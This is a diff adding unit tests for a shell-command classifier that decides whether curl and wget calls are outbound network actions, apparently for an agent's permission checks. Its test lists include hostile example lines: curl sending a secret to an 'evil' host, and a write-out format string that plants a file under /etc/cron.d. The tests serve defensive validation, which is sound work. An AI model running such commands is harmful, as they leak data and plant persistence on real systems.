@@ -367,3 +367,63 @@ describe("curl via wrappers and substitutions is judged, not mechanically flagge
 		expect(flags('echo "$(curl https://x)"')).toEqual([]);
 	});
 });
+
+describe("validated write-out format strings clear as reads on any host", () => {
+	// `-o /dev/null` discards the fetched content and a `-w` format string of
+	// literals and %{simple_name} variables prints only — together the
+	// canonical health check is a read, on any host. A format string that
+	// could write a file (%output{path}, curl 8.3+) fails closed: a gap
+	// costs a dialog, never a silent run.
+	for (const command of [
+		"curl -s -o /dev/null https://api.example.com/health",
+		"curl --output=/dev/null https://x",
+		"curl -s -o /dev/null -w '%{http_code}\\n' https://api.example.com/health",
+		"curl -o /dev/null -w '%{http_code}' http://localhost:8000/health",
+		"wget -O /dev/null https://x",
+		"wget -q --output-document /dev/null https://x",
+		"wget --output-document=/dev/null https://x",
+		// Method selectors are value-aware: GET/HEAD stay reads.
+		"curl -o /dev/null -w '%{http_code}' -X GET https://x",
+		"wget --method=GET -O /dev/null https://x",
+	]) {
+		test(`not outbound: ${command}`, () => {
+			expect(outbound(command)).toBe(false);
+		});
+	}
+	for (const command of [
+		// A real output path stays a write.
+		"curl -o /tmp/fetched https://x",
+		"wget -O out.html https://x",
+		// The format-string write channel stays closed: %output{path} (and
+		// any % sequence that is not a plain %{name} variable) fails closed.
+		"curl -w '%output{/tmp/ptr}' -o /dev/null https://x",
+		"curl --write-out=%output{/tmp/x} -o /dev/null https://x",
+		"curl -w '%output{/tmp/ptr}' https://x",
+		// Indeterminate -w values (codex round 6): a format file, a shell
+		// variable, and ANSI-C quoting can all carry %output at runtime.
+		"curl -o /dev/null -w @/tmp/format https://evil",
+		'curl -o /dev/null -w "$FORMAT" https://evil',
+		"curl -o /dev/null -w $'\\x25output{/etc/cron.d/omp}' https://evil",
+		// Discarding the response does not make a sending request a read
+		// (codex round 6): the body still hits the wire.
+		"wget --method=POST --body-data=x -O /dev/null https://evil",
+		"wget --body-data=x --output-document=/dev/null https://evil",
+		"curl -d secret -o /dev/null https://x",
+		"curl -X POST -o /dev/null https://x",
+		// Custom method spellings are not GET/HEAD.
+		"curl -o /dev/null -w '%{http_code}' --request GET-FOO https://x",
+		"wget --method=get! -O /dev/null https://x",
+	]) {
+		test(`still outbound: ${command}`, () => {
+			expect(outbound(command)).toBe(true);
+		});
+	}
+	test("send-data detection reads tokenized words, not raw text", () => {
+		// Codex round 7: quoted options and value forms must stand the
+		// /dev/null clearing down exactly like bare ones.
+		expect(outbound('curl --data-urlencode secret -o /dev/null https://evil')).toBe(true);
+		expect(outbound('curl --request POST -o /dev/null https://evil')).toBe(true);
+		expect(outbound('curl -X "POST" -o /dev/null https://evil')).toBe(true);
+		expect(outbound('curl "-d" secret -o /dev/null https://evil')).toBe(true);
+	});
+});
